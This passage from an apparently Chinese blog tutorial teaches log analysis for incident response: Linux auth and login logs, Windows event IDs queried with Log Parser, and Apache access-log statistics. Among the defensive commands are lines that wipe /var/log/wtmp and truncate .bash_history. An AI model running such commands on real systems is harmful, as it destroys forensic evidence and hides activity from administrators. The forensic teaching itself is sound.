class="keyword">var</span>/<span class="keyword">log</span>/secure | awk &#x27;&#123;<span class="keyword">print</span> <span class="variable">$11&#125;</span>&#x27; | <span class="keyword">sort</span> | uniq -c | <span class="keyword">sort</span> -nr | <span class="keyword">more</span></span><br><span class="line"></span><br><span class="line">定位有哪些 IP 在爆破：</span><br><span class="line">grep <span class="string">&quot;Failed password&quot;</span> /<span class="keyword">var</span>/<span class="keyword">log</span>/secure|grep -<span class="keyword">E</span> -o <span class="string">&quot;(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?).(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?).(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?).(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)&quot;</span>|uniq -c</span><br><span class="line"></span><br><span class="line">爆破用户名字典是什么？</span><br><span class="line">grep <span class="string">&quot;Failed password&quot;</span> /<span class="keyword">var</span>/<span class="keyword">log</span>/secure|perl -<span class="keyword">e</span> &#x27;<span class="keyword">while</span>(<span class="variable">$_</span>=&lt;&gt;)&#123; /<span class="keyword">for</span>(.*?) from/; <span class="keyword">print</span> <span class="string">&quot;$1\n&quot;</span>;&#125;&#x27;|uniq -c|<span class="keyword">sort</span> -nr</span><br><span class="line"></span><br><span class="line">登录成功的 IP 有哪些：</span><br><span class="line">grep <span class="string">&quot;Accepted &quot;</span> /<span class="keyword">var</span>/<span class="keyword">log</span>/secure | awk &#x27;&#123;<span class="keyword">print</span> <span class="variable">$11&#125;</span>&#x27; | <span class="keyword">sort</span> | uniq -c | <span class="keyword">sort</span> -nr | <span class="keyword">more</span></span><br><span class="line"></span><br><span class="line">登录成功的日期、用户名、IP：</span><br><span class="line">grep <span class="string">&quot;Accepted &quot;</span> /<span class="keyword">var</span>/<span class="keyword">log</span>/secure | awk &#x27;&#123;<span class="keyword">print</span> <span class="variable">$1</span>,<span class="variable">$2</span>,<span class="variable">$3</span>,<span class="variable">$9</span>,<span class="variable">$11&#125;</span>&#x27;</span><br><span class="line"></span><br><span class="line">增加用户</span><br><span class="line">grep <span class="string">&quot;useradd&quot;</span> /<span class="keyword">var</span>/<span class="keyword">log</span>/secure </span><br><span class="line">删除用户</span><br><span class="line">grep <span class="string">&quot;userdel&quot;</span> /<span class="keyword">var</span>/<span class="keyword">log</span>/secure</span><br></pre></td></tr></table></figure>



<p><strong>用户日志</strong></p>
<p>wtmp日志记录了用户的登录、退出、重启等情况，可以查看系统是否存在异常用户登录，判断攻击者是否已经登录服务器，由于wtmp日志为二进制文件，所以利用用last命令查看:last -t 20190426120950 ,可查看这个时间之前的日志。                                                                              清除wtmp日志命令如下：# echo &gt; /var/log/wtmp</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220801212016136.png" alt="image-20220801212016136"></p>
<p>utmp日志记录当前用户的一些信息，由于utmp日志文件同样为二进制文件，可通过w、who命令查看</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220801212107855.png" alt="image-20220801212107855"></p>
<p>lastlog命令，用于显示系统中所有用户最近一次登录信息。lastlog文件在每次有用户登录时被查询。可以使用lastlog命令检查某特定用户上次登录的时间，并格式化输出上次登录日志/var/log/lastlog的内容。它根据UID排序显示登录名、端口号（tty）和上次登录时间。如果一个用户从未登录过，lastlog显示Never logged。注意需要以root身份运行该命令。</p>
<p><strong>程序日志</strong></p>
<p>在Linux系统中，还有相当一部分应用程序并没有使用syslog服务来管理日志。而是由程序自己维护日志记录。例如，httpd网站服务程序使用两个日志文件access_log和error_log。由于多数攻击都是发布在互联网的漏洞被利用导致，留存程序日志对于日后的溯源还是很有必要的，常见的中间件有weblogic、jboss、iis、tomcat，web日志记录攻击者的行为，可通过web日志知道攻击者通过什么方式进入系统。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220801212157804.png" alt="image-20220801212157804"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220801212226440.png" alt="image-20220801212226440"></p>
<p><strong>常用的shell命令</strong></p>
<p>Linux下常用的shell命令如：find、grep 、egrep、awk、sed</p>
<p>小技巧：标准unix/linux下的grep通过下面参数控制上下文：</p>
<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">grep</span> -C <span class="number">5</span> foo <span class="keyword">file</span> 	显示<span class="keyword">file</span>文件里匹配foo字串那行以及上下<span class="number">5</span>行</span><br><span class="line">​	<span class="keyword">grep</span> -B <span class="number">5</span> foo <span class="keyword">file</span> 	显示foo及前<span class="number">5</span>行</span><br><span class="line">​	<span class="keyword">grep</span> -A <span class="number">5</span> foo <span class="keyword">file</span> 	显示foo及后<span class="number">5</span>行</span><br><span class="line">​   <span class="keyword">grep</span> -V		查看<span class="keyword">grep</span>版本号的方法</span><br><span class="line"></span><br><span class="line"><span class="keyword">grep</span> 查找含有某字符串的所有文件</span><br><span class="line"><span class="keyword">grep</span> -rni <span class="string">&quot;hello,world!&quot;</span> *</span><br><span class="line">* : 表示当前目录所有文件，也可以是某个文件名</span><br><span class="line">-r 是递归查找 （用于查找目录）</span><br><span class="line">-n 是显示行号</span><br><span class="line">-R 查找所有文件包含子目录</span><br><span class="line">-i 忽略大小写</span><br><span class="line"></span><br><span class="line"><span class="number">3</span>、如何显示一个文件的某几行：</span><br><span class="line">    cat input_file | tail -n +<span class="number">1000</span> | head -n <span class="number">2000</span></span><br><span class="line">    #从第<span class="number">1000</span>行开始，显示<span class="number">2000</span>行。即显示<span class="number">1000</span>~<span class="number">2999</span>行</span><br><span class="line"></span><br><span class="line"><span class="number">4</span>、在目录/etc中查找文件init</span><br><span class="line">    <span class="keyword">find</span> /etc -name init</span><br><span class="line"></span><br><span class="line"><span class="number">5</span>、只是显示<span class="regexp">/etc/</span>passwd的账户</span><br><span class="line">    `cat <span class="regexp">/etc/</span>passwd |awk  -F <span class="string">&#x27;:&#x27;</span>  <span class="string">&#x27;&#123;print $1&#125;&#x27;</span>`  </span><br><span class="line">    ps：awk -F指定域分隔符为<span class="string">&#x27;:&#x27;</span>，将记录按指定的域分隔符划分域，填充域，​$<span class="number">0</span>则表示所有域,$<span class="number">1</span>表示第一个域,​$n表示第n个域。</span><br><span class="line"></span><br><span class="line"><span class="number">6</span>、sed -i <span class="string">&#x27;153,$d&#x27;</span> .bash_history</span><br><span class="line">    删除历史操作记录，只保留前<span class="number">153</span>行</span><br></pre></td></tr></table></figure>

<p><strong>常见日志分析方法</strong></p>
<p>由于日志文件通常是很大，如果单纯用命令去分析日志当然可以，但也会很累，让工具来帮我们分析日志不失为好的办法。自己写脚本，根据关键字去提取有用信息，比如根据ip地址、网站路径等，下图从日志中提取的攻击者用的网站目录。 </p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220801212408593.png" alt="image-20220801212408593"></p>
<p><strong>参考链接</strong></p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">工具：</span><br><span class="line">https:<span class="regexp">//</span>security.tencent.com<span class="regexp">/index.php/</span>opensource<span class="regexp">/detail/</span><span class="number">15</span></span><br><span class="line">http:<span class="regexp">//</span>www.freebuf.com<span class="regexp">/sectool/</span><span class="number">126698</span>.html</span><br><span class="line">http:<span class="regexp">//</span>www.freebuf.com<span class="regexp">/sectool/</span><span class="number">110644</span>.html</span><br><span class="line">http:<span class="regexp">//</span>www.freebuf.com<span class="regexp">/sectool/</span><span class="number">8982</span>.html</span><br><span class="line">http:<span class="regexp">//</span>www.freebuf.com<span class="regexp">/articles/</span>web/<span class="number">96675</span>.html</span><br><span class="line"></span><br><span class="line">平台（商业项目）：</span><br><span class="line"><span class="number">360</span> &gt;&gt; <span class="number">360</span>星图		Splunk &gt;&gt; 机器数据引擎</span><br><span class="line">赛克蓝德 &gt;&gt; SeciLog	优特捷信息技术 &gt;&gt; 日志易</span><br><span class="line">HanSight瀚思 &gt;&gt; 安全易	百泉众合数据科技 &gt;&gt;LogInsight</span><br><span class="line">江南天安 &gt;&gt; 彩虹WEB攻击溯源</span><br><span class="line">平台开源项目：</span><br><span class="line">elk 	https:<span class="regexp">//</span>www.elastic.co</span><br><span class="line">scribe	https:<span class="regexp">//gi</span>thub.com<span class="regexp">/facebook/</span>scribe</span><br><span class="line">chukwa	http:<span class="regexp">//i</span>ncubator.apache.org<span class="regexp">/chukwa/</span></span><br><span class="line">kafka 	http:<span class="regexp">//</span>sna-projects.com<span class="regexp">/kafka/</span></span><br><span class="line">Flume	https:<span class="regexp">//gi</span>thub.com<span class="regexp">/cloudera/</span>flume/</span><br></pre></td></tr></table></figure>



<h2 id="Windows日志分析"><a href="#Windows日志分析" class="headerlink" title="Windows日志分析"></a>Windows日志分析</h2><p><strong>日志类型</strong></p>
<p>Windows主要有以下三类日志记录系统事件：应用程序日志、系统日志和安全日志。</p>
<p><strong>系统日志</strong></p>
<p>记录操作系统组件产生的事件，主要包括驱动程序、系统组件和应用软件的崩溃以及数据丢失错误等。系统日志中记录的时间类型由Windows NT/2000操作系统预先定义。</p>
<p>默认位置： <code>%SystemRoot%\System32\Winevt\Logs\System.evtx</code></p>
<p><strong>应用程序日志</strong></p>
<p>包含由应用程序或系统程序记录的事件，主要记录程序运行方面的事件，例如数据库程序可以在应用程序日志中记录文件错误，程序开发人员可以自行决定监视哪些事件。如果某个应用程序出现崩溃情况，那么我们可以从程序事件日志中找到相应的记录，也许会有助于你解决问题。 默认位置：<code>%SystemRoot%\System32\Winevt\Logs\Application.evtx</code></p>
<p><strong>安全日志</strong></p>
<p>记录系统的安全审计事件，包含各种类型的登录日志、对象访问日志、进程追踪日志、特权使用、帐号管理、策略变更、系统事件。安全日志也是调查取证中最常用到的日志。默认设置下，安全性日志是关闭的，管理员可以使用组策略来启动安全性日志，或者在注册表中设置审核策略，以便当安全性日志满后使系统停止响应。</p>
<p>默认位置：<code>%SystemRoot%\System32\Winevt\Logs\Security.evtx</code>         系统和应用程序日志存储着故障排除信息，对于系统管理员更为有用。 安全日志记录着事件审计信息，包括用户验证（登录、远程访问等）和特定用户在认证后对系统做了什么，对于调查人员而言，更有帮助。</p>
<p><strong>审核策略与事件查看器</strong></p>
<p>Windows Server 2008 R2 系统的审核功能在默认状态下并没有启用 ，建议开启审核策略，若日后系统出现故障、安全事故则可以查看系统的日志文件，排除故障，追查入侵者的信息等。PS：默认状态下，也会记录一些简单的日志，日志默认大小20M设置1：开始 → 管理工具 → 本地安全策略 → 本地策略 → 审核策略，参考配置操作：</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220801212650998.png" alt="image-20220801212650998"></p>
<p>帐户管理：审核创建、更改、删除用户帐户或组，修改密码，禁用、启用、重命名用户帐户等；</p>
<p>登录事件：审核每个用户帐户登录或注销成功还是失败；</p>
<p>系统事件：审核对系统安全有影响的事件、重启或关闭计算机事件等；</p>
<p>特权使用：审核用户实施其权利的每一个实例；</p>
<p>目录服务访问：审核用户访问那些指定自己的系统访问控制列表（SACL）的 Active Directory（活动目录）对象的事件；</p>
<p>对象访问：审核用户访问文件、文件夹、注册表、打印机等对象，这些对象都有特定的系统访问控制列表（SACL）；</p>
<p>策略更改：审核用户权限分配策略、审核策略、信任策略更改的每一个事件；</p>
<p>帐户登录事件：审核在这台计算机用于验证帐户时，用户登录到其它计算机或从其它计算机注销的每个实例；</p>
<p>过程跟踪：审核“程序激活、进程退出、句柄复制、间接对象访问”等事件的详细跟踪信息。</p>
<p><strong>设置2：设置合理的日志属性，即日志最大大小、事件覆盖阀值等：</strong></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220801212806046.png" alt="image-20220801212806046"></p>
<p>查看系统日志方法：在“开始”菜单上，依次指向“所有程序”、“管理工具”，然后单击“事件查看器”按 “Window+R”，输入 ”eventvwr.msc“ 也可以直接进入“事件查看器”</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220801212836589.png" alt="image-20220801212836589"></p>
<hr>
<p><strong>日志分析</strong></p>
<p>事件日志分析</p>
<p>对于Windows事件日志分析，不同的EVENT ID代表了不同的意义，摘录一些常见的安全事件的说明：</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220801212922659.png" alt="image-20220801212922659"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220801212938238.png" alt="image-20220801212938238"></p>
<p><strong>日志分析工具</strong></p>
<p><strong>Log Parser</strong></p>
<p>Log Parser（是微软公司出品的日志分析工具，它功能强大，使用简单，可以分析基于文本的日志文件、XML 文件、CSV（逗号分隔符）文件，以及操作系统的事件日志、注册表、文件系统、Active Directory。它可以像使用 SQL 语句一样查询分析这些数据，甚至可以把分析结果以各种图表的形式展现出来。</p>
<p>基本查询结构:  Logparser.exe –i:EVT –o:DATAGRID “SELECT * FROM c:\xx.evtx”</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">使用Log Parser分析日志</span><br><span class="line"></span><br><span class="line">1、查询登录成功的事件</span><br><span class="line">登录成功的所有事件</span><br><span class="line">LogParser.exe -i:EVT –o:DATAGRID  &quot;<span class="keyword">SELECT</span> *  <span class="keyword">FROM</span> c:\Security.evtx <span class="keyword">where</span> EventID=<span class="number">4624</span><span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">指定登录时间范围的事件：</span></span><br><span class="line"><span class="string">LogParser.exe -i:EVT –o:DATAGRID  &quot;</span><span class="keyword">SELECT</span> *  <span class="keyword">FROM</span> c:\Security.evtx <span class="keyword">where</span> TimeGenerated&gt;<span class="string">&#x27;2018-06-19 23:32:11&#x27;</span> <span class="keyword">and</span> TimeGenerated&lt;<span class="string">&#x27;2018-06-20 23:34:00&#x27;</span> <span class="keyword">and</span> EventID=<span class="number">4624</span><span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">提取登录成功的用户名和IP：</span></span><br><span class="line"><span class="string">LogParser.exe -i:EVT  –o:DATAGRID  &quot;</span><span class="keyword">SELECT</span> EXTRACT_TOKEN(Message,<span class="number">13</span>,<span class="string">&#x27; &#x27;</span>) <span class="keyword">as</span> EventType,TimeGenerated <span class="keyword">as</span> LoginTime,EXTRACT_TOKEN(Strings,<span class="number">5</span>,<span class="string">&#x27;|&#x27;</span>) <span class="keyword">as</span> Username,EXTRACT_TOKEN(Message,<span class="number">38</span>,<span class="string">&#x27; &#x27;</span>) <span class="keyword">as</span> Loginip <span class="keyword">FROM</span> c:\Security.evtx <span class="keyword">where</span> EventID=<span class="number">4624</span><span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">2、查询登录失败的事件</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">登录失败的所有事件：</span></span><br><span class="line"><span class="string">LogParser.exe -i:EVT –o:DATAGRID  &quot;</span><span class="keyword">SELECT</span> *  <span class="keyword">FROM</span> c:\Security.evtx <span class="keyword">where</span> EventID=<span class="number">4625</span><span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">提取登录失败用户名进行聚合统计：</span></span><br><span class="line"><span class="string">LogParser.exe  -i:EVT &quot;</span><span class="keyword">SELECT</span>  EXTRACT_TOKEN(Message,<span class="number">13</span>,<span class="string">&#x27; &#x27;</span>)  <span class="keyword">as</span> EventType,EXTRACT_TOKEN(Message,<span class="number">19</span>,<span class="string">&#x27; &#x27;</span>) <span class="keyword">as</span> <span class="keyword">user</span>,<span class="built_in">count</span>(EXTRACT_TOKEN(Message,<span class="number">19</span>,<span class="string">&#x27; &#x27;</span>)) <span class="keyword">as</span> Times,EXTRACT_TOKEN(Message,<span class="number">39</span>,<span class="string">&#x27; &#x27;</span>) <span class="keyword">as</span> Loginip <span class="keyword">FROM</span> c:\Security.evtx <span class="keyword">where</span> EventID=<span class="number">4625</span> <span class="keyword">GROUP</span> <span class="keyword">BY</span> Message<span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">3、系统历史开关机记录：</span></span><br><span class="line"><span class="string">LogParser.exe -i:EVT –o:DATAGRID  &quot;</span><span class="keyword">SELECT</span> TimeGenerated,EventID,Message <span class="keyword">FROM</span> c:\<span class="keyword">System</span>.evtx <span class="keyword">where</span> EventID=<span class="number">6005</span> <span class="keyword">or</span> EventID=<span class="number">6006</span><span class="string">&quot;</span></span><br></pre></td></tr></table></figure>

<p><strong>LogParser Lizard</strong></p>
<p>对于GUI环境的Log Parser Lizard，其特点是比较易于使用，甚至不需要记忆繁琐的命令，只需要做好设置，写好基本的SQL语句，就可以直观的得到结果。</p>
<p>下载地址：<a target="_blank" rel="noopener" href="http://www.lizard-labs.com/log_parser_lizard.aspx">http://www.lizard-labs.com/log_parser_lizard.aspx</a></p>
<p>依赖包：Microsoft .NET Framework 4 .5，下载地址：<a target="_blank" rel="noopener" href="https://www.microsoft.com/en-us/download/details.aspx?id=42642">https://www.microsoft.com/en-us/download/details.aspx?id=42642</a></p>
<p><strong>Event Log Explorer</strong></p>
<p>Event Log Explorer是一款非常好用的Windows日志分析工具。可用于查看，监视和分析跟事件记录，包括安全，系统，应用程序和其他微软Windows 的记录被记载的事件，其强大的过滤功能可以快速的过滤出有价值的信息。</p>
<p>下载地址：<a target="_blank" rel="noopener" href="https://event-log-explorer.en.softonic.com/">https://event-log-explorer.en.softonic.com/</a></p>
<h2 id="Web日志分析"><a href="#Web日志分析" class="headerlink" title="Web日志分析"></a>Web日志分析</h2><p><strong>日志分析</strong></p>
<p>Web访问日志记录了Web服务器接收处理请求及运行时错误等各种原始信息。通过对WEB日志进行的安全分析，不仅可以帮助我们定位攻击者，还可以帮助我们还原攻击路径，找到网站存在的安全漏洞并进行修复。</p>
<p>我们来看一条Apache的访问日志：</p>
<p><code>127.0.0.1 - - [11/Jun/2018:12:47:22 +0800] &quot;GET /login.html HTTP/1.1&quot; 200 786 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36&quot;</code></p>
<p>通过这条Web访问日志，我们可以清楚的得知用户在什么IP、什么时间、用什么操作系统、什么浏览器的情况下访问了你网站的哪个页面，是否访问成功。</p>
<p><strong>日志分析技巧</strong></p>
<p>在对WEB日志进行安全分析时，一般可以按照两种思路展开，逐步深入，还原整个攻击过程。</p>
<p>第一种：确定入侵的时间范围，以此为线索，查找这个时间范围内可疑的日志，进一步排查，最终确定攻击者，还原攻击过程。</p>
<p>第二种：攻击者在入侵网站后，通常会留下后门维持权限，以方便再次访问，我们可以找到该文件，并以此为线索来展开分析。</p>
<p>常用分析工具：Window下，推荐用 Sublime Text / Notepad++ 等进行日志分析，支持大文本，搜索效率还不错。</p>
<p>Linux下，使用Shell命令组合查询分析。Shell+Linux命令实现日志分析，一般结合grep、awk等命令等实现了几个常用的日志分析统计技巧。</p>
<p><strong>Apache日志分析技巧：</strong></p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">1、列出当天访问次数最多的IP命令：</span><br><span class="line">cut -<span class="keyword">d</span>- -f 1 log_file|uniq -c | <span class="keyword">sort</span> -rn | head -20</span><br><span class="line"></span><br><span class="line">2、查看当天有多少个IP访问：</span><br><span class="line">awk &#x27;&#123;<span class="keyword">print</span> <span class="variable">$1&#125;</span>&#x27; log_file|<span class="keyword">sort</span>|uniq|wc -<span class="keyword">l</span></span><br><span class="line"></span><br><span class="line">3、查看某一个页面被访问的次数：</span><br><span class="line">grep <span class="string">&quot;/index.php&quot;</span> log_file | wc -<span class="keyword">l</span></span><br><span class="line"></span><br><span class="line">4、查看每一个IP访问了多少个页面：</span><br><span class="line">awk &#x27;&#123;++S[<span class="variable">$1</span>]&#125; END &#123;<span class="keyword">for</span> (a <span class="keyword">in</span> S) <span class="keyword">print</span> a,S[a]&#125;&#x27; log_file</span><br><span class="line"></span><br><span class="line">5、将每个IP访问的页面数进行从小到大排序：</span><br><span class="line">awk &#x27;&#123;++S[<span class="variable">$1</span>]&#125; END &#123;<span class="keyword">for</span> (a <span class="keyword">in</span> S) <span class="keyword">print</span> S[a],a&#125;&#x27; log_file | <span class="keyword">sort</span> -<span class="keyword">n</span></span><br><span class="line"></span><br><span class="line">6、查看某一个IP访问了哪些页面：</span><br><span class="line">grep ^111.111.111.111 log_file| awk &#x27;&#123;<span class="keyword">print</span> <span class="variable">$1</span>,<span class="variable">$7&#125;</span>&#x27;</span><br><span class="line"></span><br><span class="line">7、去掉搜索引擎统计当天的页面：</span><br><span class="line">awk &#x27;&#123;<span class="keyword">print</span> <span class="variable">$12</span>,<span class="variable">$1&#125;</span>&#x27; log_file | grep ^\&quot;Mozilla | awk &#x27;&#123;<span class="keyword">print</span> <span class="variable">$2&#125;</span>&#x27; |<span class="keyword">sort</span> | uniq | wc -<span class="keyword">l</span></span><br><span class="line"></span><br><span class="line">8、查看2018年6月21日14时这一个小时内有多少IP访问:</span><br><span class="line">awk &#x27;&#123;<span class="keyword">print</span> <span class="variable">$4</span>,<span class="variable">$1&#125;</span>&#x27; log_file | grep 21/Jun/2018:14 | awk &#x27;&#123;<span class="keyword">print</span> <span class="variable">$2&#125;</span>&#x27;| <span class="keyword">sort</span> | uniq | wc -<span class="keyword">l</span></span><br></pre></td></tr></table></figure>

<p>日志统计分析技巧</p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">统计爬虫：</span><br><span class="line">grep -<span class="keyword">E</span> &#x27;Googlebot|Baiduspider&#x27;  /www/logs/access.2019-02-23.<span class="keyword">log</span> | awk &#x27;&#123; <span class="keyword">print</span> <span class="variable">$1</span> &#125;&#x27; | <span class="keyword">sort</span> | uniq</span><br><span class="line"></span><br><span class="line">统计浏览器：</span><br><span class="line"><span class="keyword">cat</span> /www/logs/access.2019-02-23.<span class="keyword">log</span> | grep -v -<span class="keyword">E</span> &#x27;MSIE|Firefox|Chrome|Opera|Safari|Gecko|Maxthon&#x27; | <span class="keyword">sort</span> | uniq -c | <span class="keyword">sort</span> -r -<span class="keyword">n</span> | head -<span class="keyword">n</span> 100</span><br><span class="line"></span><br><span class="line">统计网段：</span><br><span class="line"><span class="keyword">cat</span> /www/logs/access.2019-02-23.<span class="keyword">log</span> | awk &#x27;&#123;<span class="keyword">print</span> <span class="variable">$1&#125;</span>&#x27; | awk -F&#x27;.&#x27; &#x27;&#123;<span class="keyword">print</span> <span class="variable">$1</span><span class="string">&quot;.&quot;</span><span class="variable">$2</span><span class="string">&quot;.&quot;</span><span class="variable">$3</span><span class="string">&quot;.0&quot;</span>&#125;&#x27; | <span class="keyword">sort</span> | uniq -c | <span class="keyword">sort</span> -r -<span class="keyword">n</span> | head -<span class="keyword">n</span> 200</span><br><span class="line"></span><br><span class="line">统计域名：</span><br><span class="line"><span class="keyword">cat</span>  /www/logs/access.2019-02-23.<span class="keyword">log</span> |awk &#x27;&#123;<span class="keyword">print</span> <span class="variable">$2&#125;</span>&#x27;|<span class="keyword">sort</span>|uniq -c|<span class="keyword">sort</span> -rn|<span class="keyword">more</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">对某天访问的 IP 统计：</span><br><span class="line">grep &#x27;23/May/2019&#x27; /www/logs/access.2019-02-23.<span class="keyword">log</span> | awk &#x27;&#123;<span class="keyword">print</span> <span class="variable">$1&#125;</span>&#x27; | awk -F&#x27;.&#x27; &#x27;&#123;<span class="keyword">print</span> <span class="variable">$1</span><span class="string">&quot;.&quot;</span><span class="variable">$2</span><span class="string">&quot;.&quot;</span><span class="variable">$3</span><span class="string">&quot;.&quot;</span><span class="variable">$4&#125;</span>&#x27; | <span class="keyword">sort</span> | uniq -c | <span class="keyword">sort</span> -r -<span class="keyword">n</span> | head -<span class="keyword">n</span> 10</span><br><span class="line"></span><br><span class="line">HTTP Status：</span><br><span class="line"><span class="keyword">cat</span>  /www/logs/access.2019-02-23.<span class="keyword">log</span> |awk &#x27;&#123;<span class="keyword">print</span> <span class="variable">$9&#125;</span>&#x27;|<span class="keyword">sort</span>|uniq -c|<span class="keyword">sort</span> -rn|<span class="keyword">more</span></span><br><span class="line"></span><br><span class="line">URL 统计：</span><br><span class="line"><span class="keyword">cat</span>  /www/logs/access.2019-02-23.<span class="keyword">log</span> |awk &#x27;&#123;<span class="keyword">print</span> <span class="variable">$7&#125;</span>&#x27;|<span class="keyword">sort</span>|uniq -c|<span class="keyword">sort</span> -rn|<span class="keyword">more</span></span><br><span class="line"></span><br><span class="line">文件流量统计：</span><br><span class="line"><span class="keyword">cat</span> /www/logs/access.2019-02-23.<span class="keyword">log</span> |awk &#x27;&#123;<span class="keyword">sum</span>[<span class="variable">$7</span>]+=<span class="variable">$10&#125;</span>END&#123;<span class="keyword">for</span>(i <span class="keyword">in</span> <span class="keyword">sum</span>)&#123;<span class="keyword">print</span> <span class="keyword">sum</span>[i],i&#125;&#125;&#x27;|<span class="keyword">sort</span> -rn|<span class="keyword">more</span></span><br><span class="line"></span><br><span class="line">grep &#x27; 200 &#x27; /www/logs/access.2019-02-23.<span class="keyword">log</span> |awk &#x27;&#123;<span class="keyword">sum</span>[<span class="variable">$7</span>]+=<span class="variable">$10&#125;</span>END&#123;<span class="keyword">for</span>(i <span class="keyword">in</span> <span class="keyword">sum</span>)&#123;<span class="keyword">print</span> <span class="keyword">sum</span>[i],i&#125;&#125;&#x27;|<span class="keyword">sort</span> -rn|<span class="keyword">more</span></span><br><span class="line"></span><br><span class="line">URL访问量统计：</span><br><span class="line"><span class="keyword">cat</span> /www/logs/access.2019-02-23.<span class="keyword">log</span> | awk &#x27;&#123;<span class="keyword">print</span> <span class="variable">$7&#125;</span>&#x27; | egrep &#x27;\?|&amp;&#x27; | <span class="keyword">sort</span> | uniq -c | <span class="keyword">sort</span> -rn | <span class="keyword">more</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">脚本运行速度：</span><br><span class="line"></span><br><span class="line">查出运行速度最慢的脚本</span><br><span class="line"></span><br><span class="line">grep -v 0$ /www/logs/access.2019-02-23.<span class="keyword">log</span> | awk -F &#x27;\<span class="string">&quot; &#x27; &#x27;&#123;print $4&quot;</span> <span class="string">&quot; $1&#125;&#x27; web.log | awk &#x27;&#123;print $1&quot;</span> &quot;<span class="variable">$8&#125;</span>&#x27; | <span class="keyword">sort</span> -<span class="keyword">n</span> -k 1 -r | uniq &gt; /tmp/slow_url.txt</span><br><span class="line"></span><br><span class="line">IP, URL 抽取：</span><br><span class="line"></span><br><span class="line"># tail -f /www/logs/access.2019-02-23.<span class="keyword">log</span> | grep &#x27;/<span class="keyword">test</span>.html&#x27; | awk &#x27;&#123;<span class="keyword">print</span> <span class="variable">$1</span><span class="string">&quot; 